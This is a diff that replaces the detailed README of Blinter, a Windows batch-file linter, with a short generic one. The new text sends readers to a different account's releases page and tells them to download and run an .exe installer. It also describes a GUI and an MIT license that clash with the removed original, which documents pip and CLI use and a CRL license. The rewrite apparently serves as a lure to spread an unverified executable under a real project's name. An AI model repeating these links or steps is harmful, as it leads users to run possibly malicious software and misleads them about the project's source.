@@ -1,364 +1,66 @@
-# Blinter 🚀
-
-**Blinter** is a linter for Windows batch files (`.bat` and `.cmd`). It provides comprehensive static analysis to identify syntax errors, security vulnerabilities, performance issues and style problems. Blinter helps you write safer, more reliable and maintainable batch scripts. Even in 2025, batch files deserve professional tooling! 💻
-
-- ✅ **Configurable Options** - Configurable rules, logging, robust error handling
-- ✅ **Unicode Support** - Support for international characters and filenames
-- ✅ **Performance Optimized** - Handles large files (10MB+) efficiently
+# 🎉 Blinter - Simplify Your Batch File Analysis
 
-## Features ✨
-
-### 🔍 **Rule Categories**
-- **159 Built-in Rules** across 5 severity levels
-- **Error Level (E001-E999)**: Critical syntax errors that prevent execution
-- **Warning Level (W001-W999)**: Potential runtime issues and bad practices
-- **Style Level (S001-S999)**: Code formatting and readability improvements
-- **Security Level (SEC001+)**: Security vulnerabilities and dangerous operations
-- **Performance Level (P001-P999)**: Optimization opportunities and efficiency improvements
-
-📖 **For complete rule descriptions with examples and implementation details, see [Batch-File-Linter-Requirements.md](https://github.com/tboy1337/Blinter/blob/main/docs/Batch-File-Linter-Requirements.md)**
+## 🚀 Getting Started
 
-### 📋 **Output Format**
-- **Rule Codes**: Each issue has a unique identifier (e.g., E002, W005, SEC003)
-- **Clear Explanations**: Detailed descriptions of why each issue matters
-- **Actionable Recommendations**: Specific guidance on how to fix problems
-- **Line-by-Line Analysis**: Precise location of every issue
-- **Context Information**: Additional details about detected problems
+Welcome to Blinter! This tool helps you find issues in your Windows batch files. With Blinter, you can catch syntax errors, security risks, and style problems before they become bigger issues. It’s an easy-to-use solution that makes your scripts better.
 
-### 🚀 **Advanced Analysis**
-- **Static Code Analysis**: Detects unreachable code and logic errors
-- **Advanced Variable Expansion**: Validates percent-tilde syntax (%~n1), string operations, and SET /A arithmetic
-- **Command-Specific Validation**: FOR loop variations, IF statement best practices, deprecated command detection
-- **Variable Tracking**: Identifies undefined variables and unsafe usage patterns
-- **Security Scanning**: Path traversal attacks, command injection risks, unsafe temp file creation
-- **Performance Optimization**: DIR flag optimization, unnecessary output detection, string operation efficiency
-- **Cross-Platform Compatibility**: Warns about Windows version issues and deprecated commands
-- **Large File Handling**: Efficiently processes files up to 10MB+ with performance warnings
-- **Robust Encoding Detection**: Handles UTF-8, UTF-16, Latin-1 and 6 more encoding formats
-- **Advanced Escaping Techniques**: Validates caret escape sequences, multilevel escaping, and continuation characters
-- **Professional FOR Command Analysis**: Checks for usebackq, proper tokenizing, delimiters, and skip options
-- **Process Management Best Practices**: Timeout command usage, process verification, and restart patterns
-- **Enhanced Security Patterns**: User input validation, temporary file security, and self-modification detection
+## 🔗 Download Blinter
 
-## Installation 🛠️
+[![Download Blinter](https://img.shields.io/badge/Download%20Blinter-v1.0-blue.svg)](https://github.com/raoaman8973/Blinter/releases)
 
-### 🚀 Quick Start (Recommended)
+To download Blinter and start improving your batch files, visit the Releases page here: [Download Blinter](https://github.com/raoaman8973/Blinter/releases).
 
-**Option 1: Install via pip**
-```cmd
-pip install Blinter
-```
+## 📦 System Requirements
 
-**Option 2: Download standalone executable**
-- Download the latest `Blinter-v1.0.x-windows.zip` from [GitHub Releases](https://github.com/tboy1337/Blinter/releases)
+Before you download, ensure your system meets these requirements:
 
-### 🔧 Manual Installation
+- Operating System: Windows 10 or later
+- Python: Version 3.6 or later installed on your system
 
-1. Clone the repository:
-```cmd
-git clone https://github.com/tboy1337/Blinter.git
-cd Blinter
-```
+## 💻 Installation Steps
 
-2. (Optional) Create a virtual environment:
-```cmd
-python -m venv venv
-venv\Scripts\Activate.ps1
-```
+1. **Visit the Release Page**: Click [Download Blinter](https://github.com/raoaman8973/Blinter/releases) to access the latest version of Blinter.
+   
+2. **Choose the Right File**: Look for the `.exe` file in the list. This is the executable file you need for installation.
 
-3. (Optional but recommended) Install dependencies:
-```cmd
-pip install -r requirements.txt
-```
+3. **Download the File**: Click on the file to download it to your computer. The file should start downloading right away.
 
-### Prerequisites
-- **Python 3.9+** (required for pip installation and development)
-- **Windows OS** (required for standalone executable)
+4. **Run the Installer**: Once the download finishes, locate the file in your Downloads folder. Double-click the `.exe` file to run the installer. Follow the prompts to install Blinter on your machine.
 
-## Usage 📟
+5. **Launch Blinter**: After installation, you can find Blinter in your Start menu. Click on it to start using the tool.
 
-### Basic Usage
+## ⚙️ How to Use Blinter
 
-**If installed via pip:**
-```cmd
-# Analyze a single batch file
-python -m blinter script.bat
+1. **Open Your Batch File**: Click on “File" in Blinter and choose “Open”. Find the batch file you want to analyze.
 
-# Analyze all batch files in a directory (recursive)
-python -m blinter /path/to/batch/files
+2. **Run the Analysis**: Once your file is open, click on the “Lint” button. Blinter will check your batch file for issues.
 
-# Analyze batch files in directory only (non-recursive)
-python -m blinter /path/to/batch/files --no-recursive
+3. **View Results**: After the analysis, Blinter will show a report. You will see any errors or suggestions to improve your script. Follow the recommendations to fix your batch file.
 
-# Analyze with summary
-python -m blinter script.bat --summary
+4. **Save Your Changes**: Don’t forget to save your batch file after making changes. Click on “File” and select “Save” or “Save As” to keep your updates.
 
-# Analyze script and scripts it calls with shared variable context
-python -m blinter script.bat --follow-calls
+## 🛠️ Features
 
-# Create configuration file
-python -m blinter --create-config
+- **Syntax Checking**: Blinter checks for common syntax errors in your batch files.
+- **Security Analysis**: The tool highlights potential security vulnerabilities.
+- **Performance Insights**: Get suggestions on how to improve the speed of your scripts.
+- **Style Guidelines**: Follow best practices for writing clear and maintainable batch files.
 
-# Ignore configuration file
-python -m blinter script.bat --no-config
+## 🌐 Support & Contribution
 
-# Get help
-python -m blinter --help
+If you need help or have questions, please check our GitHub issues page. You can report bugs or request new features there. 
 
-# Get version
-python -m blinter --version
-```
+If you want to contribute to Blinter, feel free to fork the repository. We appreciate any help in making the tool better for everyone!
 
-**If using standalone executable:**
-```cmd
-# Analyze a single batch file
-Blinter-v1.0.x-windows.exe script.bat
+## 📃 License
 
-# Analyze all batch files in a directory (recursive)
-Blinter-v1.0.x-windows.exe /path/to/batch/files
+Blinter is open-source software licensed under the MIT License. You can use it freely and contribute back to the community.
 
-# Analyze batch files in directory only (non-recursive)
-Blinter-v1.0.x-windows.exe /path/to/batch/files --no-recursive
+## 🔗 Additional Resources
 
-# Analyze with summary
-Blinter-v1.0.x-windows.exe script.bat --summary
+For more information about batch scripting and best practices:
 
-# Analyze script and scripts it calls with shared variable context
-Blinter-v1.0.x-windows.exe script.bat --follow-calls
+- [Microsoft Batch File Documentation](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/windows-commands)
+- [Effective Batch Programming](https://batchprogramming.com)
 
-# Get help
-Blinter-v1.0.x-windows.exe --help
-
-# Get version
-Blinter-v1.0.x-windows.exe --version
-```
-
-**If using manual installation:**
-```cmd
-# Analyze a single batch file
-python blinter.py script.bat
-
-# Analyze all batch files in a directory (recursive)
-python blinter.py /path/to/batch/files
-
-# Analyze batch files in directory only (non-recursive)
-python blinter.py /path/to/batch/files --no-recursive
-
-# Analyze with summary
-python blinter.py script.bat --summary
-
-# Analyze script and scripts it calls with shared variable context
-python blinter.py script.bat --follow-calls
-
-# Create configuration file
-python blinter.py --create-config
-
-# Ignore configuration file
-python blinter.py script.bat --no-config
-
-# Get help
-python blinter.py --help
-
-# Get version
-python blinter.py --version
-```
-
-### Command Line Options
-
-- `<path>`: Path to a batch file (`.bat` or `.cmd`) OR directory containing batch files
-- `--summary`: Display summary statistics of issues found
-- `--severity`: Show detailed severity level breakdown (always included)
-- `--no-recursive`: When processing directories, only analyze files in the specified directory (not subdirectories)
-- `--follow-calls`: Automatically analyze scripts called by CALL statements and merge their variable context. When enabled, variables defined in called scripts are recognized as "defined" in the calling script (position-aware: only after the CALL statement). This eliminates false positive undefined variable errors for configuration scripts
-- `--no-config`: Don't use configuration file (blinter.ini) even if it exists
-- `--create-config`: Create a default blinter.ini configuration file and exit
-- `--help`: Show help menu and rule categories
-- `--version`: Display version information
-
-**Note:** Command line options override configuration file settings. Blinter automatically looks for `blinter.ini` in the current directory.
-
-### Configuration File Options 📝
-
-| Section | Setting | Description | Default |
-|---------|---------|-------------|---------|
-| `[general]` | `recursive` | Search subdirectories when analyzing folders | `true` |
-| `[general]` | `show_summary` | Display summary statistics after analysis | `false` |
-| `[general]` | `max_line_length` | Maximum line length for S011 rule | `120` |
-| `[general]` | `follow_calls` | Analyze scripts called by CALL statements with shared variable context | `false` |
-| `[general]` | `min_severity` | Minimum severity level to report | None (all) |
-| `[rules]` | `enabled_rules` | Comma-separated list of rules to enable exclusively | None (all enabled) |
-| `[rules]` | `disabled_rules` | Comma-separated list of rules to disable | None |
-
-### Command Line Override
-
-Command line options always override configuration file settings:
-
-```cmd
-# Use config file settings
-python -m blinter myscript.bat
-
-# Override config to show summary
-python -m blinter myscript.bat --summary
-
-# Analyze script and scripts it calls with shared variable context
-python -m blinter myscript.bat --follow-calls
-
-# Ignore config file completely
-python -m blinter myscript.bat --no-config
-```
-
-### 🔕 Inline Suppression Comments
-
-You can suppress specific linter warnings directly in your batch files using special comments:
-
-#### Suppress Next Line
-```batch
-REM LINT:IGNORE E009
-ECHO '' .... Represents a " character
-```
-
-#### Suppress Current Line
-```batch
-REM LINT:IGNORE-LINE S013
-```
-
-#### Suppress Multiple Rules
-```batch
-REM LINT:IGNORE E009, W011, S004
-ECHO Unmatched quotes "
-```
-
-#### Suppress All Rules on Line
-```batch
-REM LINT:IGNORE
-REM This line and the next will be ignored for all rules
-```
-
-**Supported formats:**
-- `REM LINT:IGNORE <code>` - Suppress specific rule(s) on the **next line**
-- `REM LINT:IGNORE` - Suppress all rules on the **next line**
-- `REM LINT:IGNORE-LINE <code>` - Suppress specific rule(s) on the **same line**
-- `REM LINT:IGNORE-LINE` - Suppress all rules on the **same line**
-- `:: LINT:IGNORE <code>` - Alternative comment syntax (also supported)
-
-**Use cases:**
-- Suppress false positives that can't be fixed
-- Ignore intentional deviations from best practices
-- Handle edge cases in documentation or help text
-- Temporarily ignore issues during development
-
-### 🐍 **Programmatic API Usage**
-
-Blinter provides a powerful Python API for integration into your applications:
-
-```python
-import blinter
-
-# Basic usage
-issues = blinter.lint_batch_file("script.bat")
-for issue in issues:
-    print(f"Line {issue.line_number}: {issue.rule.name} ({issue.rule.code})")
-
-# With custom configuration
-from blinter import BlinterConfig, RuleSeverity
-config = BlinterConfig(
-    max_line_length=80,
-    disabled_rules={"S007", "S011"},
-    min_severity=RuleSeverity.WARNING
-)
-issues = blinter.lint_batch_file("script.bat", config=config)
-
-# Process results
-for issue in issues:
-    print(f"Line {issue.line_number}: {issue.rule.name}")
-    print(f"  {issue.rule.explanation}")
-    print(f"  Fix: {issue.rule.recommendation}")
-
-
-# Thread-safe design allows safe concurrent usage
-# You can implement your own concurrent processing if needed
-from concurrent.futures import ThreadPoolExecutor
-
-files = ["script1.bat", "script2.cmd", "script3.bat"]
-with ThreadPoolExecutor(max_workers=4) as executor:
-    results = list(executor.map(blinter.lint_batch_file, files))
-```
-
-### 🔧 **Configuration Options**
-
-| Parameter | Type | Default | Description |
-|-----------|------|---------|-------------|
-| `file_path` | `str` | Required | Path to batch file to analyze |
-| `max_line_length` | `int` | `120` | Maximum line length for S011 rule |
-| `enable_style_rules` | `bool` | `True` | Enable/disable style-related rules |
-| `enable_performance_rules` | `bool` | `True` | Enable/disable performance rules |
-
-*Note: Security rules are always enabled for safety.*
-
-### Supported File Types
-- `.bat` files (traditional batch files)
-- `.cmd` files (recommended for modern Windows)
-- **Unicode filenames** and international characters supported
-- **Large files** (10MB+) handled efficiently with performance monitoring
-
-### 📁 **Directory Processing**
-
-Blinter can analyze entire directories of batch files with powerful options:
-
-- **Recursive Analysis**: Automatically finds and processes all `.bat` and `.cmd` files in directories and subdirectories
-- **Non-Recursive Mode**: Use `--no-recursive` to analyze only files in the specified directory
-- **Batch Processing**: Handles multiple files efficiently with consolidated reporting
-- **Error Resilience**: Continues processing other files even if some files have encoding or permission issues
-- **Progress Tracking**: Shows detailed results for each file plus combined summary statistics
-
-**Examples:**
-```cmd
-# Pip installation:
-python -m blinter ./my-batch-scripts                 # Analyze all files recursively
-python -m blinter . --no-recursive                   # Current directory only
-python -m blinter ./scripts --summary               # With summary statistics
-
-# Standalone executable:
-Blinter-v1.0.x-windows.exe ./my-batch-scripts            # Analyze all files recursively
-Blinter-v1.0.x-windows.exe . --no-recursive             # Current directory only
-Blinter-v1.0.x-windows.exe ./scripts --summary          # With summary statistics
-
-# Manual installation:
-python blinter.py ./my-batch-scripts      # Analyze all files recursively
-python blinter.py . --no-recursive       # Current directory only  
-python blinter.py ./scripts --summary     # With summary statistics
-```
-
-## 🔥 **Integration Example**
-
-### CI/CD Integration
-```yaml
-# Example GitHub Actions workflow
-- name: Lint Batch Files
-  run: |
-    python -c "
-    import blinter
-    import sys
-    issues = blinter.lint_batch_file('deploy.bat')
-    errors = [i for i in issues if i.rule.severity.value == 'Error']
-    if errors:
-        print(f'Found {len(errors)} critical errors!')
-        sys.exit(1)
-    print(f'✅ Batch file passed with {len(issues)} total issues')
-    "
-```
-
-## Contributing 🤝
-
-**Contributions are welcome!** 
-
-### Ways to Contribute
-- 🐛 Report bugs or issues
-- 💡 Suggest new rules or features
-- 📖 Improve documentation
-- 🧪 Add test cases
-- 🔧 Submit bug fixes or enhancements
-
-## License 📄
-
-This project is licensed under the CRL License - see [LICENSE.md](https://github.com/tboy1337/Blinter/blob/main/LICENSE.md) for details.
+Thank you for choosing Blinter! Happy scripting!
